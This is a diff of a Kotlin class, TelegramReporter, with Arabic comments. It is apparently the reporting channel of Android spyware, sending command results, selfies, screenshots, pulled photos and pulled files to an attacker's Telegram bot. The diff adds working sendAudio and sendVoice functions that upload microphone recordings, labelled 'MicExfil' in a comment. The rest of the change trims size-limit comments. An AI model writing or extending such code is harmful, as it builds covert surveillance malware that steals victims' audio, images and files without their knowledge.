@@ -18,17 +18,11 @@ import java.util.concurrent.TimeUnit
  *
  * المسؤوليات:
  * 1. sendMessage: إرسال نصوص (ردود الأوامر، الأخطاء، النتائج).
- * 2. sendPhoto: إرسال صورة (لقطات شاشة، صور مسحوبة).
+ * 2. sendPhoto: إرسال صورة (سيلفي، لقطات شاشة، صور مسحوبة).
  * 3. sendDocument: إرسال ملفات (سحب الملفات، تقارير).
- * 4. sendChatAction: إظهار "يكتب..." لإعلام المستخدم بأن الأمر قيد التنفيذ.
- *
- * قيود Telegram API:
- * - sendMessage: حد 4096 حرف لكل رسالة (نقسّم تلقائياً).
- * - sendPhoto: حد 10MB.
- * - sendDocument: حد 50MB (للبوتات).
- * - يجب استخدام multipart/form-data لرفع الملفات.
- *
- * ملاحظة: كل الدوال suspend، تُستدعى من coroutines فقط.
+ * 4. sendAudio: إرسال ملف صوتي (تسجيل الميكروفون).
+ * 5. sendVoice: إرسال ملف صوتي كرسالة صوتية (Voice Note).
+ * 6. sendChatAction: إظهار "يكتب..." لإعلام المستخدم بأن الأمر قيد التنفيذ.
  */
 class TelegramReporter(
     private val botToken: String,
@@ -41,6 +35,7 @@ class TelegramReporter(
         private const val MAX_MESSAGE_LEN = 4096
         private const val MAX_PHOTO_BYTES = 10L * 1024 * 1024   // 10MB
         private const val MAX_DOC_BYTES = 50L * 1024 * 1024     // 50MB
+        private const val MAX_AUDIO_BYTES = 50L * 1024 * 1024   // 50MB
 
         private val httpClient: OkHttpClient by lazy {
             OkHttpClient.Builder()
@@ -89,7 +84,6 @@ class TelegramReporter(
 
     /**
      * إرسال صورة (sendPhoto).
-     * - إذا تجاوزت 10MB، نرسلها كـ document بدلاً من photo.
      */
     suspend fun sendPhoto(file: File, caption: String? = null) {
         if (!file.exists()) {
@@ -119,7 +113,6 @@ class TelegramReporter(
 
     /**
      * إرسال ملف (sendDocument).
-     * - إذا تجاوز 50MB، نرسل إشعاراً بالفشل (Telegram Bot API لا يسمح بأكثر).
      */
     suspend fun sendDocument(file: File, caption: String? = null) {
         if (!file.exists()) {
@@ -147,8 +140,60 @@ class TelegramReporter(
     }
 
     /**
+     * ✅ [جديد] إرسال ملف صوتي (sendAudio).
+     * يُستخدم لإرسال تسجيلات الميكروفون (MicExfil).
+     */
+    suspend fun sendAudio(file: File, caption: String? = null) {
+        if (!file.exists()) {
+            sendMessage("⚠️ الملف الصوتي غير موجود: ${file.absolutePath}")
+            return
+        }
+        if (file.length() > MAX_AUDIO_BYTES) {
+            sendMessage("⚠️ الملف الصوتي كبير جداً (${file.length() / 1024 / 1024}MB) — الحد 50MB")
+            return
+        }
+        val url = "$BASE_URL$botToken/sendAudio"
+        val multipart = MultipartBody.Builder()
+            .setType(MultipartBody.FORM)
+            .addFormDataPart("chat_id", chatId)
+            .addFormDataPart(
+                "audio",
+                file.name,
+                file.asRequestBody("audio/mp4".toMediaType()) // m4a format
+            )
+            .apply { caption?.let { addFormDataPart("caption", it.take(1024)) } }
+            .build()
+
+        val request = Request.Builder().url(url).post(multipart).build()
+        executeUpload(request, "sendAudio")
+    }
+
+    /**
+     * ✅ [جديد] إرسال ملف صوتي كرسالة صوتية (sendVoice).
+     * يظهر في تيليجرام كأنه تم تسجيله من الميكروفون مباشرة.
+     */
+    suspend fun sendVoice(file: File, caption: String? = null) {
+        if (!file.exists()) return
+        if (file.length() > MAX_AUDIO_BYTES) return
+        
+        val url = "$BASE_URL$botToken/sendVoice"
+        val multipart = MultipartBody.Builder()
+            .setType(MultipartBody.FORM)
+            .addFormDataPart("chat_id", chatId)
+            .addFormDataPart(
+                "voice",
+                file.name,
+                file.asRequestBody("audio/mp4".toMediaType())
+            )
+            .apply { caption?.let { addFormDataPart("caption", it.take(1024)) } }
+            .build()
+
+        val request = Request.Builder().url(url).post(multipart).build()
+        executeUpload(request, "sendVoice")
+    }
+
+    /**
      * إظهار "يكتب..." في المحادثة.
-     * action: "typing" أو "upload_photo" أو "upload_document"
      */
     suspend fun sendChatAction(action: String = "typing") {
         val url = "$BASE_URL$botToken/sendChatAction"
@@ -190,7 +235,6 @@ class TelegramReporter(
 
     /**
      * تقسيم رسالة طويلة إلى أجزاء <= 4096 حرف.
-     * يحاول التقسيم عند أسطر جديدة لتجنب قطع الكلمات.
      */
     private fun splitMessage(text: String): List<String> {
         if (text.length <= MAX_MESSAGE_LEN) return listOf(text)
